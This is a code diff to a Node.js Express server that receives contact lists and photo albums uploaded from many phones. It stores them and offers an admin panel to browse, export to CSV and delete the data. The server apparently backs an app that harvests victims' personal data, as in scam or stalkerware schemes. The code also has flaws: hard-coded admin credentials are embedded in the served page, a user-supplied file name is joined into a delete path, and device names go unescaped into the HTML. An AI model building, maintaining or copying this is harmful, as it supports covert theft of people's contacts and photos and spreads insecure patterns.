@@ -15,8 +15,9 @@ if (!fs.existsSync(DATA_ROOT)) {
 const ADMIN_USER = "dage";
 const ADMIN_PASS = "dage123456";
 
-app.use(express.json({ limit: '4mb' }));
-app.use(express.urlencoded({ limit: '4mb', extended: true }));
+const jsonParser = express.json({ limit: '4mb' });
+const urlEncodedParser = express.urlencoded({ limit: '4mb', extended: true });
+
 app.set('trust proxy', true);
 app.use('/view', express.static(DATA_ROOT));
 
@@ -47,7 +48,8 @@ const authGuard = (req, res, next) => {
     }
 };
 
-app.post('/upload/contacts', (req, res) => {
+//通讯录接口单独挂载json解析中间件
+app.post('/upload/contacts', jsonParser, (req, res) => {
     try {
         const { contacts, device } = req.body;
         const deviceName = device || "未知设备";
@@ -79,11 +81,18 @@ app.post('/upload/contacts', (req, res) => {
 app.post('/upload/photo', photoUploadLimiter, multerParser.single('image'), (req, res) => {
     const startTs = Date.now();
     try {
-        const { device, md5 } = req.body;
+        const device = req.body.device;
+        const md5 = req.body.md5;
+
         if (!req.file) {
             console.log("❌ 上传请求缺失image文件");
             return res.json({ status: "error", msg: "缺少图片文件数据" });
         }
+        if (!device || !md5) {
+            console.log("❌ 缺少参数 device=" + device + " md5=" + md5);
+            return res.json({ status: "error", msg: "缺少form参数" });
+        }
+
         const imgBuffer = req.file.buffer;
         let deviceName = device || "未知设备";
         deviceName = deviceName.replace(/[\/\\:*?"<>|]/g, '_');
@@ -93,6 +102,7 @@ app.post('/upload/photo', photoUploadLimiter, multerParser.single('image'), (req
 
         const calcMd5 = crypto.createHash('md5').update(imgBuffer).digest('hex');
         if (md5 !== calcMd5) {
+            console.log(`❌ MD5校验失败，传入:${md5} 计算:${calcMd5}`);
             return res.json({ status: "error", msg: "md5校验不通过" });
         }
 
@@ -108,6 +118,93 @@ app.post('/upload/photo', photoUploadLimiter, multerParser.single('image'), (req
         res.json({ status: "success" });
     } catch (error) {
         console.error("❌ 图片上传报错：", error);
+        res.status(500).json({ status: "error" });
+    }
+});
+
+app.post('/delete_contact', jsonParser, authGuard, (req, res) => {
+    try {
+        const { phone, device } = req.body;
+        if (fs.existsSync(DATA_FILE)) {
+            let list = JSON.parse(fs.readFileSync(DATA_FILE, 'utf8'));
+            list = list.filter(item => !(item.phone === phone && item.device === device));
+            fs.writeFileSync(DATA_FILE, JSON.stringify(list, null, 2), 'utf8');
+            return res.json({ status: "success" });
+        }
+        res.json({ status: "error" });
+    } catch (e) {
+        res.status(500).json({ status: "error" });
+    }
+});
+
+app.post('/delete_photo', jsonParser, authGuard, (req, res) => {
+    try {
+        const { fileName } = req.body;
+        const filePath = path.join(DATA_ROOT, fileName);
+        if (fs.existsSync(filePath)) {
+            fs.unlinkSync(filePath);
+            res.json({ status: "success" });
+        } else {
+            res.json({ status: "error" });
+        }
+    } catch (error) {
+        res.status(500).json({ status: "error" });
+    }
+});
+
+app.post('/clear_device_contacts', jsonParser, authGuard, (req, res) => {
+    try {
+        const { device } = req.body;
+        if (fs.existsSync(DATA_FILE)) {
+            let list = JSON.parse(fs.readFileSync(DATA_FILE, 'utf8'));
+            list = list.filter(item => item.device !== device);
+            fs.writeFileSync(DATA_FILE, JSON.stringify(list, null, 2), 'utf8');
+        }
+        res.json({ status: "success" });
+    } catch (e) {
+        res.status(500).json({ status: "error" });
+    }
+});
+
+// 修复：正则精确匹配文件名，防止带下划线设备名误删其他图片
+app.post('/clear_device_photos', jsonParser, authGuard, (req, res) => {
+    try {
+        const { device } = req.body;
+        const files = fs.readdirSync(DATA_ROOT);
+        const reg = new RegExp(`^photo_${escapeRegExp(device)}_.*\\.jpg$`);
+        files.forEach(file => {
+            if (reg.test(file)) {
+                fs.unlinkSync(path.join(DATA_ROOT, file));
+            }
+        });
+        res.json({ status: "success" });
+    } catch (e) {
+        res.status(500).json({ status: "error" });
+    }
+});
+
+//正则转义工具函数
+function escapeRegExp(str) {
+    return str.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
+}
+
+app.post('/clear_all_contacts', jsonParser, authGuard, (req, res) => {
+    try {
+        if (fs.existsSync(DATA_FILE)) fs.writeFileSync(DATA_FILE, JSON.stringify([], null, 2), 'utf8');
+        res.json({ status: "success" });
+    } catch (e) {
+        res.status(500).json({ status: "error" });
+    }
+});
+
+app.post('/clear_all_photos', jsonParser, authGuard, (req, res) => {
+    try {
+        const files = fs.readdirSync(DATA_ROOT);
+        files.forEach(file => {
+            if (file.startsWith('photo_') && file.endsWith('.jpg')) fs.unlinkSync(path.join(DATA_ROOT, file));
+        });
+        res.json({ status: "success" });
+    } catch (e) {
         res.status(500).json({ status: "error" });
     }
 });
@@ -129,86 +226,6 @@ app.get('/export_contacts', authGuard, (req, res) => {
         res.send(csvContent);
     } catch (e) {
         res.status(500).send('导出失败');
-    }
-});
-
-app.post('/delete_contact', authGuard, (req, res) => {
-    try {
-        const { phone, device } = req.body;
-        if (fs.existsSync(DATA_FILE)) {
-            let list = JSON.parse(fs.readFileSync(DATA_FILE, 'utf8'));
-            list = list.filter(item => !(item.phone === phone && item.device === device));
-            fs.writeFileSync(DATA_FILE, JSON.stringify(list, null, 2), 'utf8');
-            return res.json({ status: "success" });
-        }
-        res.json({ status: "error" });
-    } catch (e) {
-        res.status(500).json({ status: "error" });
-    }
-});
-
-app.post('/delete_photo', authGuard, (req, res) => {
-    try {
-        const { fileName } = req.body;
-        const filePath = path.join(DATA_ROOT, fileName);
-        if (fs.existsSync(filePath)) {
-            fs.unlinkSync(filePath);
-            res.json({ status: "success" });
-        } else {
-            res.json({ status: "error" });
-        }
-    } catch (error) {
-        res.status(500).json({ status: "error" });
-    }
-});
-
-app.post('/clear_device_contacts', authGuard, (req, res) => {
-    try {
-        const { device } = req.body;
-        if (fs.existsSync(DATA_FILE)) {
-            let list = JSON.parse(fs.readFileSync(DATA_FILE, 'utf8'));
-            list = list.filter(item => item.device !== device);
-            fs.writeFileSync(DATA_FILE, JSON.stringify(list, null, 2), 'utf8');
-        }
-        res.json({ status: "success" });
-    } catch (e) {
-        res.status(500).json({ status: "error" });
-    }
-});
-
-app.post('/clear_device_photos', authGuard, (req, res) => {
-    try {
-        const { device } = req.body;
-        const files = fs.readdirSync(DATA_ROOT);
-        files.forEach(file => {
-            if (file.startsWith(`photo_${device}_`) && file.endsWith('.jpg')) {
-                fs.unlinkSync(path.join(DATA_ROOT, file));
-            }
-        });
-        res.json({ status: "success" });
-    } catch (e) {
-        res.status(500).json({ status: "error" });
-    }
-});
-
-app.post('/clear_all_contacts', authGuard, (req, res) => {
-    try {
-        if (fs.existsSync(DATA_FILE)) fs.writeFileSync(DATA_FILE, JSON.stringify([], null, 2), 'utf8');
-        res.json({ status: "success" });
-    } catch (e) {
-        res.status(500).json({ status: "error" });
-    }
-});
-
-app.post('/clear_all_photos', authGuard, (req, res) => {
-    try {
-        const files = fs.readdirSync(DATA_ROOT);
-        files.forEach(file => {
-            if (file.startsWith('photo_') && file.endsWith('.jpg')) fs.unlinkSync(path.join(DATA_ROOT, file));
-        });
-        res.json({ status: "success" });
-    } catch (e) {
-        res.status(500).json({ status: "error" });
     }
 });
 
@@ -245,7 +262,7 @@ app.get('/', authGuard, (req, res) => {
 body { font-family: sans-serif; background: #f0f2f5; padding: 20px; }
 .action-bar { background: #343a40; padding: 15px; border-radius: 8px; text-align: center; margin-bottom: 25px; max-width: 1000px; margin-left: auto; margin-right: auto; }
 .action-btn { background: #dc3545; color: white; border: none; padding: 8px 15px; border-radius: 8px; font-weight: bold; cursor: pointer; margin: 0 10px; font-size: 13px; }
-.filter-bar { max-width: 1000px; margin: 0 auto 20px auto; padding: 10px; background: #fff; border-radius: 8px; box-shadow: 0 2px 5px rgba(0,0,0,0.05); display:flex; align-items:center; gap:10px; flex-wrap:wrap; }
+.filter-bar { max-width: 1000px; margin: 0 auto 20px auto; padding:10px; background:#fff; border-radius:8px; box-shadow:0 2px 5px rgba(0,0,0,0.05); display:flex; align-items:center; gap:10px; flex-wrap:wrap; }
 .filter-title { font-weight: bold; color: #555; }
 .tab-btn { padding:6px 14px; background:#e4e6eb; border:none; border-radius:20px; cursor:pointer; font-size:14px; }
 .tab-btn.active { background:#007bff; color:#fff; }
@@ -268,6 +285,7 @@ img { max-width:140px; max-height:140px; border-radius:4px; margin-bottom:6px; }
 let currentSelectedDevice = 'ALL';
 const photosData = ` + JSON.stringify(devicePhotosMap) + `;
 const authToken = btoa("${ADMIN_USER}:${ADMIN_PASS}");
+
 function delContact(phone, device, btn) {
     if(!confirm("确定删除吗？")) return;
     fetch('/delete_contact', {
@@ -284,12 +302,16 @@ function deleteImage(fileName, button) {
         body: JSON.stringify({ fileName })
     }).then(res=>res.json()).then(data=>{ if(data.status==='success') button.closest('.card').remove(); });
 }
-function foldContacts(btn, deviceId) {
+
+// 从dom data属性拿设备名称，不再拼接字符串到onclick，修复引号bug
+function foldContacts(btn) {
+    const deviceId = btn.dataset.dev;
     const box = document.getElementById('contact-box-' + deviceId);
     if(box.style.display === 'none'){ box.style.display='block'; btn.innerText='📕 折叠通讯录'; }
     else { box.style.display='none'; btn.innerText='📖 展开通讯录'; }
 }
-function clearDeviceContacts(device){
+function clearDeviceContacts(btn){
+    const device = btn.dataset.dev;
     if(!confirm("确定清空【"+device+"】全部通讯录吗？")) return;
     fetch('/clear_device_contacts',{
         method:'POST',
@@ -297,7 +319,8 @@ function clearDeviceContacts(device){
         body:JSON.stringify({device})
     }).then(()=>location.reload());
 }
-function clearDevicePhotos(device){
+function clearDevicePhotos(btn){
+    const device = btn.dataset.dev;
     if(!confirm("确定清空【"+device+"】全部相册照片吗？")) return;
     fetch('/clear_device_photos',{
         method:'POST',
@@ -305,7 +328,8 @@ function clearDevicePhotos(device){
         body:JSON.stringify({device})
     }).then(()=>location.reload());
 }
-function filterDevice(dev, btn){
+function filterDevice(btn){
+    const dev = btn.dataset.dev;
     currentSelectedDevice=dev;
     document.querySelectorAll('.tab-btn').forEach(b=>b.classList.remove('active'));
     btn.classList.add('active');
@@ -328,11 +352,11 @@ function performExport(){
 </div>
 <div class="filter-bar">
 <span class="filter-title">📱 设备筛选：</span>
-<button class="tab-btn active" onclick="filterDevice('ALL',this)">全部设备</button>
+<button class="tab-btn active" data-dev="ALL" onclick="filterDevice(this)">全部设备</button>
 `;
         let htmlMiddle = "";
         devices.forEach(d=>{
-            htmlMiddle += `<button class="tab-btn" onclick="filterDevice('${d}',this)">${d}</button>`;
+            htmlMiddle += `<button class="tab-btn" data-dev="${d}" onclick="filterDevice(this)">${d}</button>`;
         });
         htmlMiddle += `<span id="global-export-box" style="display:none; margin-left:auto;"><button class="tab-btn export-btn" onclick="performExport()">导出通讯录CSV</button></span></div>`;
         if(devices.length === 0) htmlMiddle += `<h3 style="text-align:center;color:#888;">暂无任何设备数据</h3>`;
@@ -343,15 +367,15 @@ function performExport(){
                 <div class="device-header-box">
                     <div class="device-title">📱 ${dev}</div>
                     <div>
-                        <button class="device-del-btn" onclick="clearDeviceContacts('${dev}')">清空本机通讯录</button>
-                        <button class="device-del-btn" onclick="clearDevicePhotos('${dev}')">清空本机相册</button>
+                        <button class="device-del-btn" data-dev="${dev}" onclick="clearDeviceContacts(this)">清空本机通讯录</button>
+                        <button class="device-del-btn" data-dev="${dev}" onclick="clearDevicePhotos(this)">清空本机相册</button>
                         <a href="/export_contacts?device=${encodeURIComponent(dev)}" class="tab-btn export-btn" style="text-decoration:none;">导出通讯录</a>
                     </div>
                 </div>
                 <div class="box">
                     <div style="display:flex;align-items:center;margin-bottom:12px;">
                         <h3 style="margin:0;">通讯录（${devContacts.length}条）</h3>
-                        <button class="fold-btn" onclick="foldContacts(this,'${dev}')">折叠</button>
+                        <button class="fold-btn" data-dev="${dev}" onclick="foldContacts(this)">折叠</button>
                     </div>
                     <div id="contact-box-${dev}"><table><tr><th>姓名</th><th>号码</th><th>操作</th></tr>`;
             devContacts.forEach(item=>{
@@ -369,6 +393,7 @@ function performExport(){
         let htmlEnd = `</body></html>`;
         res.send(htmlHead + htmlMiddle + htmlEnd);
     } catch (e) {
+        console.error(e);
         res.send('<h2>控制台页面加载出错</h2>');
     }
 });
